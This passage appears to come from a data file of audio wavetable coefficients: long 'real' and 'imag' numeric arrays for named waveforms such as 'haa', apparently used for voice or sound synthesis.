0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 ],  imag: [ 0, -.090905, .482287, .259485, .009402, -.125271, -.046816, .007872, .001762, -.010488, -.002305, .001791, .001101, -.000303, -.000064, .000143, .000059, .000116, .00012, -.000011, -.000066, -.000019, .000024, .000014, .000069, .000056, .000005, .000002, -.000026, -.000015, .000055, .000012, .000046, -.000007, .000007, -.000003, -.000007, .000002, -.000003, -.00001, -.000011, -.000004, .000003, .000001, .000005, -.000001, -.000004, .000001, .000001, .000001, .000004, 0, -.000001, .000001, .000004, -.000001, -.000002, 0, -.000003, -.000004, .000003, -.000007, 0, .000001, .000003, .000002, 0, -.000001, 0, .000001, .000006, -.000008, -.000016, .000013, .000017, .000013, .000001, 0, -.000002, -.000001, -.000004, .000007, .000016, .000021, -.000008, -.000013, .000003, .000006, -.000001, .000001, .000002, 0, .000001, -.000001, .000001, 0, 0, -.000004, .000002, 0, .000001, .000002, -.000001, -.000005, .000004, .000014, .000005, -.000006, -.000007, -.000001, -.000001, 0, .000009, .000009, .000001, -.000006, -.000008, .000001, .000002, -.000001, -.000002, 0, .000001, .000001, 0, 0, .000002, -.000002, 0, -.000001, 0, 0, -.000001, -.000001, 0, 0, .000001, 0, 0, -.000001, 0, 0, 0, 0, .000001, .000001, -.000002, -.000003, -.000001, .000002, -.000001, -.000007, -.000002, .000002, .000004, 0, .000001, .000001, -.000002, -.000006, -.000002, .000003, .000006, .000001, 0, 0, .000002, -.000001, -.000001, -.000001, .000001, 0, 0, -.000001, 0, .000003, .000008, .000001, -.00001, -.000006, .000015, -.000026, -.000075, -.00001, .00005, .000082, .000023, -.000004, 0, -.000002, -.000045, -.000002, .000041, .000093, -.000009, -.000034, .000008, .00002, -.000001, -.000006, -.000001, 0, -.000002, -.000004, -.000003, -.000003, -.000002, -.000003, -.000002, -.000002, -.000002, -.000001, -.000001, -.000001, -.000001, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 ] } ],
	[ "haa",         { real: [ 0, .246738, .08389, .095378, .087885, .165621, .287369, -.328845, -.099613, -.198535, .260484, .012771, .013351, .006221, .003106, .000629, -.003591, -.002876, -.003527, -.002975, -.002648, -.006996, -.004165, -.004266, -.000731, .003727, .018167, .012018, -.017044, -.004816, -.001255, -.002032, .000272, -.001849, .004334, .000773, -.00069, -.000207, .000136, -.000108, .000508, -.000701, -.000958, -.004677, .002005, -.001925, -.00145, -.002212, -.001163, -.000227, .000182, -.000448, .000152, -.000316, -.000054, -.000193, -.00017, -.000138, -.000179, .000059, .000017, .000008, .000252, .000382, -.000319, .00002, -.000087, .00002, -.000024, -.000002, .000044, -.000131, .000145, -.000581, -.000182, -.001087, -.000746, -.002759, -.001195, -.002868, -.000729, -.002915, .000325, -.001489, .000419, -.000322, .000054, -.0002, .000032, .000071, .000196, -.000127, .000355, -.000328, .000518, -.00028, .00062, -.00036, .000553, -.000153, .000088, .000227, .000454, -.000071, .0002, -.000214, .000326, -.00043, .000123, -.000226, .000094, -.000102, -.000003, -.000096, .000084, .000037, -.000107, -.000201, .000152, -.0003, -.000197, -.000083, .000063, -.000092, .000009, -.000076, -.000057, .000094, .000096, -.000071, -.000529, -.000336, -.000661, -.000637, -.001247, -.000167, -.001025, -.001483, .000107, -.000321, -.000251, .000186, .000315, -.000163, -.000102, -.001242, -.001912, -.000113, .000724, .00079, .000078, -.000061, .000077, -.000069, .00005, .000002, -.000077, -.000168, .000073, .000044, .000047, .000093, -.000101, -.000012, -.000048, -.000033, .000034, -.000304, -.000188, -.000116, -.000167, -.000096, -.000298, -.000044, -.000107, -.000036, -.000012, .000043, .000191, -.000126, -.000011, .0001, .000098, -.000021, -.000129, -.000016, -.000182, -.000203, -.000249, -.000452, -.000216, -.000162, .000092, .000246, -.000028, -.000214, .000035, .000038, -.000032, -.000037, -.000015, -.00001, -.000011, -.00004, -.000014, -.00002, -.000031, -.000023, -.000012, 0, 0, .000004, .000008, .000014, .000015, .000016, .000018, .000019, .000019, .000017, .000016, .000015, .000014, .000012, .000011, .00001, .00001, .000009, .000008, .000008, .000008, .000007, .000006, .000007, .000007, .000006, .000005, .000006, .000006, .000005, .000005, .000005, .000005, .000004, .000004, .000004, .000005, .000004, .000004, .000004, .000004, .000004, .000003, .000004, .000004, .000003, .000003, .000003, .000004, .000003, .000003, .000003, .000003, .000003, .000003, .000003, .000003, .000003, .000002, .000003, .000003, .000003, .000002, .000003, .000003, .000002, .000002, .000002, .000003, .000002, .000002, .000002, .000003, .000002, .000002, .000002, .000002, .000002, .000002, .000002, .000002, .000002, .000002, .000002, .000002, .000002, .000002, .000002, .000002, .000002, .000002, .000002, .000002, .000002, .000001, .000002, .000002, .000002, .000001, .000002, .000002, .000002, .000001, .000002, .000002, .000002, .000001, .000002, .000002, .000001, .000001, .000001, .000002, .000001, .000001, .000001, .000002, .000001, .000001, .000001, .000002, .000001, .000001, .000001, .000002, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, 0, .000001, .000001, .000001, .000001, .000001, .000001, .000001, 0, .000001, .000001, .000001, 0, .000001, .000001, .000001, 0, .000001, .000001, .000001, 0, .000001, .000001, .000001, 0, .000001, .000001, .000001, 0, .000001, .000001, .000001, 0, .000001, .000001, .000001, 0, .000001, .000001, .000001, 0, .000001, .000001, 0, 0, .000001, .000001, 0, 0, 0, .000001, 0, 0, 0, .000001, 0, 0, 0, .000001, 0, 0, 0, .000001, 0, 0, 0, .000001, 0, 0, 0, .000001, 0, 0, 0, .000001, 0, 0, 0, .000001, 0, 0, 0, .000001, 0, 0, 0, .000001, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 ],  imag: [ 0, -.011959, .106385, .027196, .04077, .010807, -.17632, -.376644, .052966, .242678, .322558, -.029071, -.017862, -.018765, -.010794, -.010157, -.004212, -.001923, -.002589, -.000607, -.001983, -.000421, -.001835, .003069, .005389, .012023, .003422, -.013914, -.008548, .007815, .002234, .003867, .000488, .000824, -.002685, -.000085, -.002967, -.000125, -.000831, -.000192, -.000222, -.003892, .000474, -.002069, .001899, .001648, -.00049, .001615, -.000309, -.000211, -.000327, -.000702, .000325, -.000152, .000048, .000011, .000152, -.000106, -.000003, -.000063, .000026, -.000104, -.000479, -.000528, -.000551, -.000202, -.00024, -.000079, -.000078, .000053, -.000058, .000163, .000573, -.000025, .000171, -.001189, .000385, -.000574, -.000608, -.000859, -.00066, -.000638, -.002096, -.000233, -.002119, .000081, -.001687, -.000175, -.00059, .000237, .000237, .000232, .000473, .000578, .00056, .000534, .000858, .001336, .000692, .001099, .000203, -.000084, -.000032, -.000114, -.000094, -.000085, -.000034, -.000303, .000267, .000139, -.000143, .000062, -.000023, -.000049, -.000084, -.000129, -.000141, -.000123, .000102, .000171, -.000007, .000123, .000116, .00012, .000003, .000098, .000055, -.000044, -.000258, -.000552, -.000945, -.00028, -.000222, -.000038, -.000132, -.000249, .00088, .000518, .001033, .000874, .000496, .000873, .000276, -.000206, -.000785, -.000948, -.000148, .001179, .000101, -.000833, -.000357, -.000168, -.000115, -.000072, -.000116, -.000215, 